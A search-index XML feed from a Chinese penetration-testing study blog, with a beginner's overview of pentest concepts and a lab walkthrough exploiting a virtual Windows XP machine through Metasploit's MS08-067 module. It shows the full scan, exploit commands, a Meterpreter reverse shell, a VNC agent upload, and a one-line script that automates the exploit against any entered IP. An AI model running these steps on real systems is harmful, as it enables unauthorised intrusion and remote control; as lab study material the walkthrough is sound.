<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[[渗透学习]2.对Winxp的渗透攻击]]></title>
    <url>%2F2019%2F08%2F04%2F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0-2-%E5%AF%B9Winxp%E7%9A%84%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[初次对Win XP的渗透 ** 基本信息:** Kali: IP:10.10.10.128 Win Xp Home Edition (未开启防火墙) 两者都为虚拟机 渗透过程 1.Nmap扫描本地网络 123456789101112131415msf5 &gt; nmap -sP 10.10.10.0/24[*] exec: nmap -sP 10.10.10.0/24Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-04 13:55 CSTNmap scan report for 10.10.10.1Host is up (0.00018s latency).MAC Address: 00:50:56:C0:00:08 (VMware)Nmap scan report for 10.10.10.2Host is up (0.00013s latency).MAC Address: 00:50:56:E0:25:15 (VMware)Nmap scan report for 10.10.10.131Host is up (0.00027s latency).MAC Address: 00:0C:29:85:CA:88 (VMware)...Nmap done: 256 IP addresses (5 hosts up) scanned in 4.13 seconds 其中10.10.10.131为渗透目标 2.搜集目标信息 2.1获取目标的操作系统信息 12345678910111213141516171819[*] exec: nmap -O 10.10.10.131Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-04 13:58 CSTNmap scan report for 10.10.10.131Host is up (0.00055s latency).Not shown: 997 closed portsPORT STATE SERVICE135/tcp open msrpc139/tcp open netbios-ssn445/tcp open microsoft-dsMAC Address: 00:0C:29:85:CA:88 (VMware)Device type: general purposeRunning: Microsoft Windows XP|2003OS CPE: cpe:/o:microsoft:windows_xp::sp2:professional cpe:/o:microsoft:windows_server_2003OS details: Microsoft Windows XP Professional SP2 or Windows Server 2003Network Distance: 1 hopOS detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 4.63 seconds 扫描结果也可能有不正确的地方 但我们能从中得知OS为Win XP SP2 因为我安装的Win XP没更新也没开启防火墙所以可以利用MS08-067发起攻击 3.利用Metasploit的渗透攻击模块进行攻击 3.1.搜寻并加载模块 12345678910111213141516171819202122232425msf5 &gt; search ms08-067Matching Modules================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/smb/ms08_067_netapi 2008-10-28 great Yes MS08-067 Microsoft Server Service Relative Path Stack Corruptionmsf5 &gt; use exploit/windows/smb/ms08_067_netapimsf5 exploit(windows/smb/ms08_067_netapi) &gt; show optionsModule options (exploit/windows/smb/ms08_067_netapi): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target address range or CIDR identifier RPORT 445 yes The SMB service port (TCP) SMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC)Exploit target: Id Name -- ---- 0 Automatic Targeting 3.2.设置必要的信息 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899msf5 exploit(windows/smb/ms08_067_netapi) &gt; set RHOSTS 10.10.10.131RHOSTS =&gt; 10.10.10.131msf5 exploit(windows/smb/ms08_067_netapi) &gt; show targetsExploit targets: Id Name -- ---- 0 Automatic Targeting 1 Windows 2000 Universal 2 Windows XP SP0/SP1 Universal 3 Windows 2003 SP0 Universal 4 Windows XP SP2 English (AlwaysOn NX) 5 Windows XP SP2 English (NX) 6 Windows XP SP3 English (AlwaysOn NX) 7 Windows XP SP3 English (NX) 8 Windows XP SP2 Arabic (NX) 9 Windows XP SP2 Chinese - Traditional / Taiwan (NX) 10 Windows XP SP2 Chinese - Simplified (NX) 11 Windows XP SP2 Chinese - Traditional (NX) 12 Windows XP SP2 Czech (NX) 13 Windows XP SP2 Danish (NX) 14 Windows XP SP2 German (NX) 15 Windows XP SP2 Greek (NX) 16 Windows XP SP2 Spanish (NX) 17 Windows XP SP2 Finnish (NX) 18 Windows XP SP2 French (NX) 19 Windows XP SP2 Hebrew (NX) 20 Windows XP SP2 Hungarian (NX) 21 Windows XP SP2 Italian (NX) 22 Windows XP SP2 Japanese (NX) 23 Windows XP SP2 Korean (NX) 24 Windows XP SP2 Dutch (NX) 25 Windows XP SP2 Norwegian (NX) 26 Windows XP SP2 Polish (NX) 27 Windows XP SP2 Portuguese - Brazilian (NX) 28 Windows XP SP2 Portuguese (NX) 29 Windows XP SP2 Russian (NX) 30 Windows XP SP2 Swedish (NX) 31 Windows XP SP2 Turkish (NX) 32 Windows XP SP3 Arabic (NX) 33 Windows XP SP3 Chinese - Traditional / Taiwan (NX) 34 Windows XP SP3 Chinese - Simplified (NX) 35 Windows XP SP3 Chinese - Traditional (NX) 36 Windows XP SP3 Czech (NX) 37 Windows XP SP3 Danish (NX) 38 Windows XP SP3 German (NX) 39 Windows XP SP3 Greek (NX) 40 Windows XP SP3 Spanish (NX) 41 Windows XP SP3 Finnish (NX) 42 Windows XP SP3 French (NX) 43 Windows XP SP3 Hebrew (NX) 44 Windows XP SP3 Hungarian (NX) 45 Windows XP SP3 Italian (NX) 46 Windows XP SP3 Japanese (NX) 47 Windows XP SP3 Korean (NX) 48 Windows XP SP3 Dutch (NX) 49 Windows XP SP3 Norwegian (NX) 50 Windows XP SP3 Polish (NX) 51 Windows XP SP3 Portuguese - Brazilian (NX) 52 Windows XP SP3 Portuguese (NX) 53 Windows XP SP3 Russian (NX) 54 Windows XP SP3 Swedish (NX) 55 Windows XP SP3 Turkish (NX) 56 Windows 2003 SP1 English (NO NX) 57 Windows 2003 SP1 English (NX) 58 Windows 2003 SP1 Japanese (NO NX) 59 Windows 2003 SP1 Spanish (NO NX) 60 Windows 2003 SP1 Spanish (NX) 61 Windows 2003 SP1 French (NO NX) 62 Windows 2003 SP1 French (NX) 63 Windows 2003 SP2 English (NO NX) 64 Windows 2003 SP2 English (NX) 65 Windows 2003 SP2 German (NO NX) 66 Windows 2003 SP2 German (NX) 67 Windows 2003 SP2 Portuguese - Brazilian (NX) 68 Windows 2003 SP2 Spanish (NO NX) 69 Windows 2003 SP2 Spanish (NX) 70 Windows 2003 SP2 Japanese (NO NX) 71 Windows 2003 SP2 French (NO NX) 72 Windows 2003 SP2 French (NX)msf5 exploit(windows/smb/ms08_067_netapi) &gt; set target 10target =&gt; 10msf5 exploit(windows/smb/ms08_067_netapi) &gt; show optionsModule options (exploit/windows/smb/ms08_067_netapi): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS 10.10.10.131 yes The target address range or CIDR identifier RPORT 445 yes The SMB service port (TCP) SMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC)Exploit target: Id Name -- ---- 10 Windows XP SP2 Chinese - Simplified (NX) 3.3.发起攻击 1234567msf5 exploit(windows/smb/ms08_067_netapi) &gt; exploit[*] Started reverse TCP handler on 10.10.10.128:4444 [*] 10.10.10.131:445 - Attempting to trigger the vulnerability...[*] Sending stage (179779 bytes) to 10.10.10.131[*] Meterpreter session 1 opened (10.10.10.128:4444 -&gt; 10.10.10.131:1046) at 2019-08-04 14:23:41 +0800 3.4.攻击载荷模块 1234567891011121314151617181920212223242526272829meterpreter &gt; ipconfigInterface 1============Name : MS TCP Loopback interfaceHardware MAC : 00:00:00:00:00:00MTU : 1520IPv4 Address : 127.0.0.1Interface 2============Name : AMD PCNET Family PCI Ethernet Adapter - rfaceHardware MAC : 00:0c:29:85:ca:88MTU : 1500IPv4 Address : 10.10.10.131IPv4 Netmask : 255.255.255.0Interface 65540============Name : Bluetooth @�Hardware MAC : c8:21:58:95:b0:86MTU : 1500meterpreter &gt; run vnc[*] Creating a VNC reverse tcp stager: LHOST=10.10.10.128 LPORT=4545[*] Running payload handler[*] VNC stager executable 73802 bytes long[*] Uploaded the VNC agent to C:\WINDOWS\TEMP\jOcidjq.exe (must be deleted manually)[*] Executing the VNC agent with endpoint 10.10.10.128:4545...]]></content>
      <categories>
        <category>渗透学习</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>实战演习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[渗透学习]1.了解渗透测试]]></title>
    <url>%2F2019%2F08%2F03%2F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0-1-%E4%BA%86%E8%A7%A3%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%2F</url>
    <content type="text"><![CDATA[渗透和Metasploit的基本知识 一.初识渗透 1.渗透基本知识 1.1.渗透分类 黑盒测试 白盒测试 灰盒测试 1.2.渗透测试方法 OSSTMM NIST OWASP WASC-TC PTES 1.3.渗透测试过程 前期交互阶段 情报搜集阶段 威胁建模阶段 漏洞分析阶段 渗透攻击阶段 后渗透攻击阶段 2.漏洞基本知识 2.1.漏洞生命周期 2.2.漏洞披露方式 完全公开披露 负责任的公开披露 地下经济链 小范围利用直至被披露 2.3.漏洞公共资源库 Exploit-db VULHUB 3.Metasploit 包括了: 辅助模块 渗透攻击模块 攻击载荷模块 空指令模块 编码器模块 3.1.安装Metasploit Kali自带Metasploit msfgui msfconsole msfcli(命令行程序) 用msfconsole -x代替 示例: 123456789echo &quot;请输入目标IP&quot;read ipmsfconsole -x &quot;use exploit/windows/smb/ms08_067_netapi;set RHOST $ip;set target 10;exploit&quot; 参考书籍:Metasploit渗透测试魔鬼训练营]]></content>
      <categories>
        <category>渗透学习</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
</search>
